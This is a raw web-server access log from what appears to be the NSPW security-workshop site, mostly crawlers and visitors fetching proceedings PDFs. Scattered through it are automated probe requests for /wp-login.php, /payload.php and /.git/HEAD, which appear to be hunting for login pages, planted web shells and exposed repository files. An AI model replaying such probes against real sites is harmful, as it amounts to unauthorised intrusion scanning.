200.137.65.102 - - [02/May/2018:16:47:15 -0400] "GET /2009/proceedings/1993/nspw1993-strens.pdf HTTP/1.1" 200 717655 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Zotero/5.0"
200.137.65.102 - - [02/May/2018:16:47:17 -0400] "GET /2009/proceedings/1993/nspw1993-strens.pdf HTTP/1.1" 200 717655 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Zotero/5.0"
157.55.39.141 - - [02/May/2018:16:47:02 -0400] "GET /papers/1993/nspw1993-lin.pdf HTTP/1.1" 200 1019039 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.49.75.180 - - [02/May/2018:16:48:19 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.49.75.180 - - [02/May/2018:16:48:21 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:16:49:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:16:49:27 -0400] "GET /2008/cfp/?C=S;O=A HTTP/1.1" 403 3965 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
178.149.6.15 - - [02/May/2018:16:51:20 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.149.6.15 - - [02/May/2018:16:51:20 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:16:54:00 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
217.121.26.179 - - [02/May/2018:16:55:21 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
217.121.26.179 - - [02/May/2018:16:55:22 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.217 - - [02/May/2018:16:56:20 -0400] "GET /papers/2005/nspw2005-bishop-pos.pdf HTTP/1.1" 200 609280 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.179 - - [02/May/2018:16:57:59 -0400] "GET /2009/proceedings/2004/nspw2004-dragovic.pdf HTTP/1.1" 200 144063 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
178.220.135.188 - - [02/May/2018:16:58:07 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.220.135.188 - - [02/May/2018:16:58:08 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:16:58:52 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
105.229.137.120 - - [02/May/2018:17:00:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.6 - - [02/May/2018:17:01:12 -0400] "GET /2011/ HTTP/1.1" 200 13550 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
207.46.13.1 - - [02/May/2018:17:05:11 -0400] "GET /papers/2004/nspw2004-sadeghi.pdf HTTP/1.1" 200 226793 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:17:05:24 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
122.177.90.127 - - [02/May/2018:17:06:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
122.177.90.127 - - [02/May/2018:17:06:07 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
222.89.74.225 - - [02/May/2018:17:07:15 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 200 460020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
211.115.79.122 - - [02/May/2018:17:07:34 -0400] "GET / HTTP/1.1" 200 11581 "-" "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36"
34.203.217.206 - - [02/May/2018:17:08:10 -0400] "GET /cfp/flyer_NSPW_2014.pdf HTTP/1.1" 200 71336 "-" "python-requests/2.18.4"
5.255.250.67 - - [02/May/2018:17:08:11 -0400] "GET /2009/proceedings/1997/?C=D;O=D HTTP/1.1" 200 4359 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.219 - - [02/May/2018:17:08:45 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:17:10:24 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
173.212.228.153 - - [02/May/2018:17:11:21 -0400] "GET / HTTP/1.1" 200 6334 "http://nspw.org" "Go-http-client/1.1"
41.248.156.149 - - [02/May/2018:17:12:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.248.156.149 - - [02/May/2018:17:12:05 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
222.89.74.225 - - [02/May/2018:17:12:15 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 200 460020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
69.162.124.227 - - [02/May/2018:17:15:24 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
5.189.150.18 - - [02/May/2018:17:15:35 -0400] "GET / HTTP/1.1" 200 11592 "-" "libwww-perl/6.33"
73.15.7.132 - - [02/May/2018:17:18:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
73.15.7.132 - - [02/May/2018:17:18:28 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
137.112.228.195 - - [02/May/2018:17:19:11 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
216.244.66.236 - - [02/May/2018:17:19:13 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:17:19:13 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:17:19:14 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
93.158.161.149 - - [02/May/2018:17:20:06 -0400] "GET /papers/2004/nspw2004-haldar.pdf HTTP/1.1" 200 80749 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:17:20:23 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.217 - - [02/May/2018:17:21:09 -0400] "GET / HTTP/1.1" 200 6608 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [02/May/2018:17:21:07 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 666959 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:17:22:06 -0400] "GET /papers/2010/nspw2010-faily.pdf HTTP/1.1" 200 539882 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:17:22:45 -0400] "GET /node/25 HTTP/1.1" 200 6158 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:17:25:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.141 - - [02/May/2018:17:27:54 -0400] "GET /papers/2002/nspw2002-capkun.pdf HTTP/1.1" 200 622994 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:17:30:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
223.218.104.68 - - [02/May/2018:17:31:57 -0400] "GET / HTTP/1.1" 200 6621 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
192.95.30.29 - - [02/May/2018:17:32:40 -0400] "GET /payload.php HTTP/1.0" 404 7975 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
192.95.30.29 - - [02/May/2018:17:32:40 -0400] "GET /payload.php HTTP/1.0" 404 7975 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
66.249.64.217 - - [02/May/2018:17:33:34 -0400] "GET /2018 HTTP/1.1" 200 6902 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.18 - - [02/May/2018:17:34:32 -0400] "GET /2008 HTTP/1.1" 301 3971 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.31 - - [02/May/2018:17:34:33 -0400] "GET /2008/ HTTP/1.1" 200 8539 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
207.46.13.204 - - [02/May/2018:17:35:11 -0400] "GET /robots.txt HTTP/1.1" 200 4623 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:17:35:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.141 - - [02/May/2018:17:34:46 -0400] "GET /papers/2001/nspw2001-brostoff.pdf HTTP/1.1" 200 1049060 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [02/May/2018:17:35:38 -0400] "GET /2009/proceedings/1996/?C=S;O=D HTTP/1.1" 200 4419 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.102.7.59 - - [02/May/2018:17:36:32 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
77.88.47.40 - - [02/May/2018:17:35:59 -0400] "GET /2009/proceedings/2007/nspw2007-frontmatter.pdf HTTP/1.1" 200 658233 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:17:37:15 -0400] "GET /papers/1999/nspw1999-li.pdf HTTP/1.1" 200 587572 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:17:40:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.179 - - [02/May/2018:17:41:56 -0400] "GET /papers/2002/nspw2002-venkatakrishnan.pdf HTTP/1.1" 200 859056 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [02/May/2018:17:43:02 -0400] "GET /papers/2007/nspw2007-frontmatter.pdf HTTP/1.1" 200 658233 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:17:45:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.215 - - [02/May/2018:17:45:59 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
199.59.150.181 - - [02/May/2018:17:48:01 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
69.162.124.227 - - [02/May/2018:17:50:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
85.191.17.44 - - [02/May/2018:17:51:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
85.191.17.44 - - [02/May/2018:17:51:52 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.221.81.199 - - [02/May/2018:17:52:15 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.221.81.199 - - [02/May/2018:17:52:15 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.25.223.120 - - [02/May/2018:17:52:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7686 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.25.223.120 - - [02/May/2018:17:52:35 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:17:52:58 -0400] "GET /2000/pc.html HTTP/1.1" 200 5250 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
213.57.18.47 - - [02/May/2018:17:53:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
213.57.18.47 - - [02/May/2018:17:53:29 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:17:53:37 -0400] "GET / HTTP/1.1" 200 6635 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
31.223.145.204 - - [02/May/2018:17:53:59 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.223.145.204 - - [02/May/2018:17:54:02 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.17 - - [02/May/2018:17:54:21 -0400] "GET /2008/oc.shtml HTTP/1.1" 200 5868 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:17:55:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.219 - - [02/May/2018:17:58:25 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 200 189194 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
95.121.25.130 - - [02/May/2018:17:59:03 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.121.25.130 - - [02/May/2018:17:59:04 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:18:00:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
125.99.176.102 - - [02/May/2018:18:01:56 -0400] "GET /wp-login.php HTTP/1.1" 404 7495 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.141 - - [02/May/2018:18:02:52 -0400] "GET /papers/2005/nspw2005-taylor-pos.pdf HTTP/1.1" 200 464746 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [02/May/2018:18:03:40 -0400] "GET /2008/past.shtml HTTP/1.1" 200 5707 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:18:05:19 -0400] "GET /2005/dates.shtml HTTP/1.1" 200 4997 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:18:05:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:18:06:31 -0400] "GET /2009/proceedings/2001/nspw2001-raskin.pdf HTTP/1.1" 200 512667 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
189.24.79.150 - - [02/May/2018:18:08:59 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.24.79.150 - - [02/May/2018:18:09:08 -0400] "GET / HTTP/1.1" 200 8363 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:18:10:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
195.22.127.231 - - [02/May/2018:18:10:35 -0400] "GET /.git/HEAD HTTP/1.1" 403 3965 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
66.249.64.215 - - [02/May/2018:18:10:50 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.200 - - [02/May/2018:18:13:48 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
131.107.174.143 - - [02/May/2018:18:14:25 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 4163 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [02/May/2018:18:14:45 -0400] "-" 408 3408 "-" "-"
69.162.124.227 - - [02/May/2018:18:15:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.179 - - [02/May/2018:18:15:53 -0400] "GET /papers/1994/nspw1994-spalka.pdf HTTP/1.1" 200 982984 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.54 - - [02/May/2018:18:17:04 -0400] "GET /papers/2001/nspw2001-pal.pdf HTTP/1.1" 200 789338 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
82.245.116.232 - - [02/May/2018:18:18:06 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.245.116.232 - - [02/May/2018:18:18:06 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.113.85.105 - - [02/May/2018:18:18:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.113.85.105 - - [02/May/2018:18:18:41 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:18:20:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.1 - - [02/May/2018:18:21:00 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 512725 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
199.16.157.182 - - [02/May/2018:18:22:34 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
77.88.47.40 - - [02/May/2018:18:21:29 -0400] "GET /papers/2010/nspw2010-franz.pdf HTTP/1.1" 200 1973449 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
2.51.96.191 - - [02/May/2018:18:23:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.219 - - [02/May/2018:18:23:14 -0400] "GET /2017 HTTP/1.1" 200 7048 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
2.51.96.191 - - [02/May/2018:18:23:15 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:18:23:14 -0400] "GET /2009/proceedings/1996/nspw1996-orman.pdf HTTP/1.1" 200 591485 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:18:25:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
103.242.190.75 - - [02/May/2018:18:26:10 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.242.190.75 - - [02/May/2018:18:26:11 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.137.186.115 - - [02/May/2018:18:28:09 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.54 - - [02/May/2018:18:28:16 -0400] "GET /2004 HTTP/1.1" 301 4461 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:18:30:22 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
187.59.119.3 - - [02/May/2018:18:33:06 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.59.119.3 - - [02/May/2018:18:33:09 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
